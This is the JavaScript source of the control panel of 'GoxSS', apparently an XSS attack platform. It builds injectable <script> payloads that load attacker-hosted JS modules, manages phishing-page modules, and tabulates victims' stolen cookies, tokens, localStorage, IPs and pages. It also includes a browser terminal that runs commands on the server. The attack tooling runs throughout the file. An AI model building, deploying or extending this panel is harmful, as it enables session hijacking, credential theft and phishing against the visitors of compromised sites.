// GoxSS 面板逻辑：视图切换 + 回显轮询 + 项目管理 + JS 模块管理 + 趋势图
const B = window.GOXSS_BASE || ''; // 部署随机路径
const API = B + '/api/hits';
const PROJ_API = B + '/api/projects';
const JS_API = B + '/api/js';
let lastSeq = 0;
let hits = [];
let projects = [];
let jsModules = [];
let view = 'dashboard';

document.addEventListener('DOMContentLoaded', () => {
    const $ = (id) => document.getElementById(id);
    const esc = (s) => {
        const d = document.createElement('div');
        d.textContent = s == null ? '' : s;
        return d.innerHTML || '-';
    };
    const clip = (s, n) => (s && String(s).length > n ? String(s).slice(0, n) + '…' : (s || '-'));

    /* ═══════ 视图切换 ═══════ */
    const viewMeta = {
        dashboard: ['总览', '实时捕获的 XSS 回显与敏感信息'],
        records:   ['回显记录', '所有回传数据的明细与检索'],
        projects:  ['项目管理', '创建注入项目并选择 JS 模块'],
        jsmodules: ['JS 模块', '每个 XSS 功能独立一个 JS，可自写 JS / 钓鱼页面'],
        shell:     ['终端', '在浏览器里直接执行服务器命令，无需远程连接'],
    };
    document.querySelectorAll('.nav-item').forEach((item) => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            document.querySelectorAll('.nav-item').forEach((i) => i.classList.remove('active'));
            item.classList.add('active');
            view = item.dataset.view;
            document.querySelectorAll('.view').forEach((v) => v.classList.add('hidden'));
            $('view-' + view).classList.remove('hidden');
            $('viewTitle').textContent = viewMeta[view][0];
            $('viewDesc').textContent = viewMeta[view][1];
            if (view === 'dashboard') drawChart();
            if (view === 'shell') setTimeout(() => $('cmdInput').focus(), 50);
        });

        /* ═══════ 管理终端 ═══════ */
        const term = $('term');
        const cmdInput = $('cmdInput');
        const shellHistory = [];
        let histPos = -1;

        function termLine(text, cls) {
            const div = document.createElement('div');
            div.className = 'term-line' + (cls ? ' ' + cls : '');
            div.textContent = text;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }

        async function runCmd(cmd) {
            termLine('λ ' + cmd, 'term-cmd');
            histPos = -1;
            if (shellHistory[0] !== cmd) shellHistory.unshift(cmd);
            if (shellHistory.length > 100) shellHistory.pop();
            cmdInput.value = '';
            cmdInput.disabled = true;
            try {
                const res = await fetch(B + '/api/exec', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cmd }),
                });
                if (res.status === 401) { window.handle401(); cmdInput.disabled = false; return; }
                const data = await res.json();
                if (data.out && data.out.trim()) termLine(data.out.replace(/\r/g, ''), '');
                else termLine('(无输出)', 'term-info');
            } catch (e) {
                termLine('执行失败: ' + e, 'term-err');
            }
            cmdInput.disabled = false;
            cmdInput.focus();
        }

        cmdInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && cmdInput.value.trim()) runCmd(cmdInput.value.trim());
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (histPos < shellHistory.length - 1) { histPos++; cmdInput.value = shellHistory[histPos]; }
            }
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (histPos > 0) { histPos--; cmdInput.value = shellHistory[histPos]; }
                else { histPos = -1; cmdInput.value = ''; }
            }
        });
        $('clearTerm').addEventListener('click', () => {
            term.innerHTML = '';
            termLine('已清屏。', 'term-info');
            cmdInput.focus();
        });
    });

    /* ═══════ 项目加载 ═══════ */
    async function loadProjects() {
        try {
            const res = await fetch(PROJ_API);
            if (res.status === 401) { window.handle401(); return; }
            const data = await res.json();
            projects = data.projects || [];
            renderProjects();
            renderProjOptions();
        } catch (e) {}
    }

    function projName(id) {
        const p = projects.find((x) => x.id === id);
        return p ? p.name : id;
    }

    function renderProjOptions() {
        const opts = projects
            .map((p) => `<option value="${esc(p.id)}">${esc(p.name)} (${esc(p.id)})</option>`)
            .join('');
        const keep1 = $('quickProj').value, keep2 = $('projSelect').value, keep3 = $('filterProj').value;
        $('quickProj').innerHTML = opts;
        $('projSelect').innerHTML = opts;
        $('filterProj').innerHTML = '<option value="">全部项目</option>' + opts;
        if ([...$('quickProj').options].some((o) => o.value === keep1)) $('quickProj').value = keep1;
        if ([...$('projSelect').options].some((o) => o.value === keep2)) $('projSelect').value = keep2;
        if ([...$('filterProj').options].some((o) => o.value === keep3)) $('filterProj').value = keep3;
        updateQuickPayload();
        updateBigPayload();
        $('projBadge').textContent = projects.length;
        $('projBadge').dataset.zero = projects.length ? '0' : '1';
    }

    function renderProjects() {
        const tbody = $('projRows');
        if (!projects.length) {
            tbody.innerHTML = '<tr><td colspan="7" class="empty">暂无项目，先在左侧创建一个</td></tr>';
            return;
        }
        tbody.innerHTML = projects.map((p) => {
            const jsList = (p.jsIDs || []).map(modName);
            return `<tr data-id="${esc(p.id)}">
                <td><span class="pill">${esc(p.id)}</span></td>
                <td>${esc(p.name)}</td>
                <td class="muted" title="${esc(p.desc)}">${esc(clip(p.desc, 24))}</td>
                <td class="mono">${p.hitCount}</td>
                <td title="${esc(jsList.join(', '))}">${jsList.length
                    ? `<span class="tag-yes">${jsList.length} 个模块</span>`
                    : '<span class="tag-no">—</span>'}</td>
                <td class="muted">${esc(p.created)}</td>
                <td class="row-actions">
                    <button class="btn mini edit-proj">编辑</button>
                    <button class="btn mini danger-mini del-proj">删除</button>
                </td>
            </tr>`;
        }).join('');

        tbody.querySelectorAll('tr[data-id]').forEach((tr) => {
            const id = tr.dataset.id;
            tr.querySelector('.edit-proj').addEventListener('click', () => openEdit(id));
            tr.querySelector('.del-proj').addEventListener('click', () => delProject(id));
        });
    }

    /* ═══════ 项目 CRUD ═══════ */
    // 渲染模块勾选列表（新建表单 / 编辑弹窗共用）
    function renderJSChecklist(container, checked) {
        checked = checked || [];
        if (!jsModules.length) {
            container.innerHTML = '<span class="muted">还没有任何 JS 模块，先到「JS 模块」页创建</span>';
            return;
        }
        container.innerHTML = jsModules.map((m) => {
            const on = checked.includes(m.id);
            return `<label class="js-check ${on ? 'on' : ''}">
                <input type="checkbox" value="${esc(m.id)}" ${on ? 'checked' : ''}>
                <span class="js-check-name">${esc(m.name)}</span>
                <span class="js-check-desc">${esc(clip(m.desc, 34))}</span>
            </label>`;
        }).join('');
        container.querySelectorAll('input[type=checkbox]').forEach((cb) => {
            cb.addEventListener('change', () => {
                cb.closest('.js-check').classList.toggle('on', cb.checked);
            });
        });
    }
    function collectChecked(container) {
        return [...container.querySelectorAll('input[type=checkbox]:checked')].map((c) => c.value);
    }

    $('createBtn').addEventListener('click', async () => {
        const name = $('newName').value.trim();
        if (!name) { alert('请填写项目名称'); return; }
        const body = {
            name: name,
            desc: $('newDesc').value.trim(),
            jsIDs: collectChecked($('newJSList')),
        };
        const res = await fetch(PROJ_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        if (res.ok) {
            const p = await res.json();
            $('newName').value = ''; $('newDesc').value = '';
            $('newJSList').querySelectorAll('input[type=checkbox]').forEach((c) => {
                c.checked = false; c.closest('.js-check').classList.remove('on');
            });
            await loadProjects();
            $('projSelect').value = p.id;
            updateBigPayload();
        } else {
            const err = await res.json().catch(() => ({}));
            alert(err.error || '创建失败');
        }
    });

    async function delProject(id) {
        if (!confirm(`确定删除项目「${projName(id)}」？其回显记录将保留。`)) return;
        const res = await fetch(PROJ_API + '/' + encodeURIComponent(id), { method: 'DELETE' });
        if (res.ok) { await loadProjects(); await load(); }
    }

    function openEdit(id) {
        const p = projects.find((x) => x.id === id);
        if (!p) return;
        $('editId').textContent = p.id;
        $('editName').value = p.name;
        $('editDesc').value = p.desc || '';
        renderJSChecklist($('editJSList'), p.jsIDs || []);
        $('modal').classList.remove('hidden');
    }

    $('saveProj').addEventListener('click', async () => {
        const id = $('editId').textContent;
        const body = {
            name: $('editName').value.trim(),
            desc: $('editDesc').value.trim(),
            jsIDs: collectChecked($('editJSList')),
        };
        const res = await fetch(PROJ_API + '/' + encodeURIComponent(id), {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        if (res.ok) {
            $('modal').classList.add('hidden');
            await loadProjects();
        } else {
            const err = await res.json().catch(() => ({}));
            alert(err.error || '保存失败');
        }
    });

    /* ═══════ JS 模块管理（每个功能独立一个模块，可自写 JS / 钓鱼页面） ═══════ */
    async function loadModules() {
        try {
            const res = await fetch(JS_API);
            if (res.status === 401) { window.handle401(); return; }
            const data = await res.json();
            jsModules = data.modules || [];
            renderModules();
            renderJSChecklist($('newJSList'), collectChecked($('newJSList')));
            $('jsBadge').textContent = jsModules.length;
            $('jsBadge').dataset.zero = jsModules.length ? '0' : '1';
        } catch (e) {}
    }

    function modName(id) {
        const m = jsModules.find((x) => x.id === id);
        return m ? m.name : id;
    }

    function renderModules() {
        const tbody = $('jsRows');
        if (!jsModules.length) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty">暂无模块，先在左侧创建一个</td></tr>';
            return;
        }
        const lines = (c) => String(c || '').split('\n').length;
        tbody.innerHTML = jsModules.map((m) => {
            const usedBy = projects.filter((p) => (p.jsIDs || []).includes(m.id)).length;
            const isHook = m.id === 'hook';
            const lockBadge = isHook ? '<span class="tag-yes" title="系统模块，默认不可修改">🔒 系统模块</span>' : '';
            return `<tr data-jsid="${esc(m.id)}">
                <td><span class="pill">${esc(m.id)}</span></td>
                <td>${esc(m.name)} ${lockBadge}</td>
                <td class="muted" title="${esc(m.desc)}">${esc(clip(m.desc, 30))}</td>
                <td class="mono">${lines(m.code)} 行</td>
                <td class="muted">${esc(m.created)}<br><span class="tag-yes">${usedBy} 个项目使用</span></td>
                <td class="row-actions">
                    ${isHook
                        ? '<span class="muted" style="font-size:.76rem">默认锁定</span>'
                        : `<button class="btn mini edit-js">编辑</button>
                           <button class="btn mini danger-mini del-js">删除</button>`}
                </td>
            </tr>`;
        }).join('');
        tbody.querySelectorAll('tr[data-jsid]').forEach((tr) => {
            const id = tr.dataset.jsid;
            if (id === 'hook') return; // 系统模块：无编辑/删除入口
            tr.querySelector('.edit-js').addEventListener('click', () => openEditJS(id));
            tr.querySelector('.del-js').addEventListener('click', () => delJS(id));
        });
    }

    $('createJSBtn').addEventListener('click', async () => {
        const name = $('newJSName').value.trim();
        if (!name) { alert('请填写模块名称'); return; }
        const body = {
            name: name,
            desc: $('newJSDesc').value.trim(),
            code: $('newJSCode').value,
        };
        const res = await fetch(JS_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        if (res.ok) {
            $('newJSName').value = ''; $('newJSDesc').value = ''; $('newJSCode').value = '';
            await loadModules();
        } else {
            const err = await res.json().catch(() => ({}));
            alert(err.error || '创建失败');
        }
    });

    function openEditJS(id) {
        const m = jsModules.find((x) => x.id === id);
        if (!m) return;
        $('editJSId').textContent = m.id;
        $('editJSName').value = m.name;
        $('editJSDesc').value = m.desc || '';
        $('editJSCode').value = m.code || '';
        $('jsModal').classList.remove('hidden');
    }

    $('saveJS').addEventListener('click', async () => {
        const id = $('editJSId').textContent;
        const body = {
            name: $('editJSName').value.trim(),
            desc: $('editJSDesc').value.trim(),
            code: $('editJSCode').value,
        };
        if (!body.name) { alert('模块名称不能为空'); return; }
        const res = await fetch(JS_API + '/' + encodeURIComponent(id), {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        if (res.ok) {
            $('jsModal').classList.add('hidden');
            await loadModules();
        } else {
            const err = await res.json().catch(() => ({}));
            alert(err.error || '保存失败');
        }
    });

    async function delJS(id) {
        const m = jsModules.find((x) => x.id === id);
        if (!confirm(`确定删除模块「${m ? m.name : id}」？将同时从所有项目中移除该模块。`)) return;
        const res = await fetch(JS_API + '/' + encodeURIComponent(id), { method: 'DELETE' });
        if (res.ok) { await loadModules(); await loadProjects(); }
    }

    /* ═══════ Payload 联动（短链形式 /s/<短码>） ═══════ */
    function shortPayload(id) {
        const p = projects.find((x) => x.id === id);
        const code = (p && p.short) || id;
        return `<script src="${location.origin}/s/${code}"><\/script>`; // 短链固定根路径，不随随机后台路径变化
    }
    function updateQuickPayload() {
        $('payload').textContent = shortPayload($('quickProj').value || 'demo');
    }
    function updateBigPayload() {
        $('payloadBig').textContent = shortPayload($('projSelect').value || 'demo');
    }
    $('quickProj').addEventListener('change', updateQuickPayload);
    $('projSelect').addEventListener('change', updateBigPayload);

    /* ═══════ 复制 / 清空 / 搜索 ═══════ */
    function bindCopy(btn, getText) {
        $(btn).addEventListener('click', () => {
            navigator.clipboard.writeText(getText()).then(() => {
                const b = $(btn), old = b.textContent;
                b.textContent = '已复制 ✓';
                setTimeout(() => (b.textContent = old), 1500);
            });
        });
    }
    bindCopy('copyBtn', () => $('payload').textContent);
    bindCopy('copyBigBtn', () => $('payloadBig').textContent);

    $('clearBtn').addEventListener('click', async () => {
        if (!confirm('确定清空所有回显记录？')) return;
        await fetch(B + '/api/clear', { method: 'POST' });
        lastSeq = 0;
        load();
    });

    // 退出登录
    $('logoutBtn').addEventListener('click', async () => {
        if (!confirm('确定退出登录？')) return;
        await fetch(B + '/api/logout', { method: 'POST' });
        location.href = B + '/login';
    });

    /* ═══════ 修改密码 ═══════ */
    $('changePassBtn').addEventListener('click', () => {
        $('passOld').value = ''; $('passNew').value = ''; $('passConfirm').value = '';
        $('passErr').classList.add('hidden');
        $('passModal').classList.remove('hidden');
        $('passOld').focus();
    });
    $('passClose').addEventListener('click', () => $('passModal').classList.add('hidden'));
    $('passModal').addEventListener('click', (e) => {
        if (e.target === $('passModal')) $('passModal').classList.add('hidden');
    });
    $('passSave').addEventListener('click', async () => {
        const errEl = $('passErr');
        errEl.classList.add('hidden');
        const body = {
            old: $('passOld').value,
            new: $('passNew').value,
            confirm: $('passConfirm').value,
        };
        if (!body.old || !body.new) { errEl.textContent = '请填写完整'; errEl.classList.remove('hidden'); return; }
        if (body.new !== body.confirm) { errEl.textContent = '两次输入的新密码不一致'; errEl.classList.remove('hidden'); return; }
        const res = await fetch(B + '/api/password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        if (res.ok) {
            alert('密码修改成功，请重新登录');
            location.href = B + '/login';
            return;
        }
        const data = await res.json().catch(() => ({}));
        errEl.textContent = data.error || '修改失败';
        errEl.classList.remove('hidden');
    });

    // 401 统一处理：会话过期跳转登录页
    window.handle401 = () => { location.href = B + '/login'; };

    $('search').addEventListener('input', load);
    $('filterProj').addEventListener('change', load);

    /* ═══════ 回显数据 ═══════ */
    async function load() {
        try {
            const res = await fetch(API);
            if (res.status === 401) { window.handle401(); return; }
            const data = await res.json();
            $('status').textContent = '在线推送中';
            render(data.hits || []);
        } catch (e) {
            $('status').textContent = '连接失败';
        }
    }

    function render(list) {
        hits = list;
        const tbody = $('hits');

        $('statTotal').textContent = list.length;
        $('statTokens').textContent = list.filter((h) => h.token && h.token !== '-').length;
        $('statCookies').textContent = list.filter((h) => h.cookie && h.cookie !== '-').length;
        $('statIPs').textContent = new Set(list.map((h) => h.ip)).size;

        const badge = $('navBadge');
        badge.textContent = list.length;
        badge.dataset.zero = list.length ? '0' : '1';

        const kw = ($('search').value || '').toLowerCase();
        const projF = $('filterProj').value;
        let filtered = list;
        if (projF) filtered = filtered.filter((h) => h.id === projF);
        if (kw) filtered = filtered.filter((h) =>
            [h.ip, h.url, h.token, h.cookie, h.id, h.ua].some((v) => (v || '').toLowerCase().includes(kw))
        );

        if (!list.length) {
            tbody.innerHTML =
                '<tr><td colspan="9" class="empty">暂无回显数据 — 复制 Payload，在演示受害页触发试一试</td></tr>';
            return;
        }

        const maxSeq = Math.max(...list.map((h) => h.seq));
        tbody.innerHTML = filtered.length
            ? filtered.map((h) => {
                  const isNew = h.seq > lastSeq && lastSeq > 0;
                  return `<tr data-seq="${h.seq}" class="${isNew ? 'new-row' : ''}">
                <td class="muted">${h.seq}</td>
                <td class="muted">${esc(h.time)}</td>
                <td><span class="pill">${esc(clip(projName(h.id), 14))}</span></td>
                <td class="mono">${esc(h.ip)}</td>
                <td title="${esc(h.url)}">${esc(clip(h.url, 38))}</td>
                <td class="mono" title="${esc(h.cookie)}">${esc(clip(h.cookie, 24))}</td>
                <td class="mono" title="${esc(h.token)}">${esc(clip(h.token, 24))}</td>
                <td class="muted" title="${esc(h.ua)}">${esc(clip(h.ua, 26))}</td>
                <td><button class="btn mini">详情</button></td>
            </tr>`;
              }).join('')
            : '<tr><td colspan="9" class="empty">没有匹配的记录</td></tr>';
        lastSeq = maxSeq;

        tbody.querySelectorAll('tr[data-seq]').forEach((tr) => {
            tr.addEventListener('click', () => showDetail(Number(tr.dataset.seq)));
        });

        if (view === 'dashboard') drawChart();
    }

    /* ═══════ 回显详情弹窗 ═══════ */
    function showDetail(seq) {
        const h = hits.find((x) => x.seq === seq);
        if (!h) return;
        const rows = [
            ['序号', h.seq], ['项目ID', h.id], ['时间', h.time], ['来源IP', h.ip],
            ['页面URL', h.url], ['域名', h.domain], ['页面标题', h.title],
            ['Referrer', h.referrer], ['Cookie', h.cookie], ['Token', h.token],
            ['LocalStorage', h.localstorage], ['UserAgent', h.ua], ['回传通道', h.channel],
            ['附加数据', h.extra],
        ];
        $('modalSeq').textContent = '#' + h.seq;
        $('modalBody').textContent = rows
            .map(([k, v]) => k.padEnd(12, '　') + ': ' + (v || '-'))
            .join('\n');
        $('detail').classList.remove('hidden');
    }

    $('detailClose').addEventListener('click', () => $('detail').classList.add('hidden'));
    $('detail').addEventListener('click', (e) => {
        if (e.target === $('detail')) $('detail').classList.add('hidden');
    });
    $('modalClose').addEventListener('click', () => $('modal').classList.add('hidden'));
    $('modal').addEventListener('click', (e) => {
        if (e.target === $('modal')) $('modal').classList.add('hidden');
    });
    $('jsModalClose').addEventListener('click', () => $('jsModal').classList.add('hidden'));
    $('jsModal').addEventListener('click', (e) => {
        if (e.target === $('jsModal')) $('jsModal').classList.add('hidden');
    });

    /* ═══════ 趋势图（近 10 分钟） ═══════ */
    function drawChart() {
        const canvas = $('chart');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        const W = canvas.width, H = canvas.height;
        ctx.clearRect(0, 0, W, H);

        const now = Date.now();
        const buckets = new Array(10).fill(0);
        hits.forEach((h) => {
            const t = new Date(h.time.replace(' ', 'T')).getTime();
            const minsAgo = Math.floor((now - t) / 60000);
            if (minsAgo >= 0 && minsAgo < 10) buckets[9 - minsAgo]++;
        });
        const maxV = Math.max(1, ...buckets);

        const pad = 24, bw = (W - pad * 2) / 10;
        ctx.strokeStyle = 'rgba(34,48,80,.6)';
        ctx.lineWidth = 1;
        for (let i = 0; i <= 4; i++) {
            const y = pad + ((H - pad * 2) * i) / 4;
            ctx.beginPath(); ctx.moveTo(pad, y); ctx.lineTo(W - pad, y); ctx.stroke();
        }
        buckets.forEach((v, i) => {
            const x = pad + i * bw + bw * 0.2;
            const hgt = ((H - pad * 2) * v) / maxV;
            const y = H - pad - hgt;
            const grad = ctx.createLinearGradient(0, y, 0, H - pad);
            grad.addColorStop(0, 'rgba(56,189,248,.9)');
            grad.addColorStop(1, 'rgba(129,140,248,.35)');
            ctx.fillStyle = grad;
            roundRect(ctx, x, y, bw * 0.6, Math.max(hgt, v ? 2 : 0), Math.min(6, bw * 0.2));
            ctx.fill();
            if (v) {
                ctx.fillStyle = '#8b97b0';
                ctx.font = '11px sans-serif';
                ctx.textAlign = 'center';
                ctx.fillText(String(v), x + bw * 0.3, y - 6);
            }
            const d = new Date(now - (9 - i) * 60000);
            ctx.fillStyle = '#556284';
            ctx.font = '10px sans-serif';
            ctx.textAlign = 'center';
            ctx.fillText(`${String(d.getMinutes()).padStart(2, '0')}`, x + bw * 0.3, H - 8);
        });
    }
    function roundRect(ctx, x, y, w, h, r) {
        ctx.beginPath();
        ctx.moveTo(x + r, y);
        ctx.arcTo(x + w, y, x + w, y + h, r);
        ctx.arcTo(x + w, y + h, x, y + h, r);
        ctx.arcTo(x, y + h, x, y, r);
        ctx.arcTo(x, y, x + w, y, r);
        ctx.closePath();
    }

    /* ═══════ WebSocket 实时推送（失败自动降级轮询） ═══════ */
    let ws = null;
    let wsOK = false;
    let pollTimer = null;
    let debounce = null;

    function connectWS() {
        const proto = location.protocol === 'https:' ? 'wss://' : 'ws://';
        try {
            ws = new WebSocket(proto + location.host + B + '/ws');
        } catch (e) {
            startPolling();
            return;
        }
        ws.onopen = () => {
            wsOK = true;
            stopPolling();
        };
        ws.onmessage = (ev) => {
            let msg;
            try { msg = JSON.parse(ev.data); } catch (e) { return; }
            // 收到事件后刷新对应数据（防抖合并突发消息）
            if (debounce) return;
            debounce = setTimeout(() => {
                debounce = null;
                if (msg.type === 'projects') loadProjects();
                else if (msg.type === 'js') loadModules();
                else load(); // hit / hits / 其他
            }, 100);
        };
        ws.onclose = () => {
            wsOK = false;
            $('status').textContent = '降级轮询';
            startPolling();
            setTimeout(connectWS, 5000); // 断线重连
        };
        ws.onerror = () => { try { ws.close(); } catch (e) {} };
    }

    function startPolling() {
        if (pollTimer) return;
        load();
        loadProjects();
        loadModules();
        pollTimer = setInterval(() => { load(); loadProjects(); loadModules(); }, 3000);
    }
    function stopPolling() {
        if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
    }

    loadModules();
    loadProjects();
    load();
    connectWS();
    // 项目列表低频兜底刷新
    setInterval(loadProjects, 10000);
});
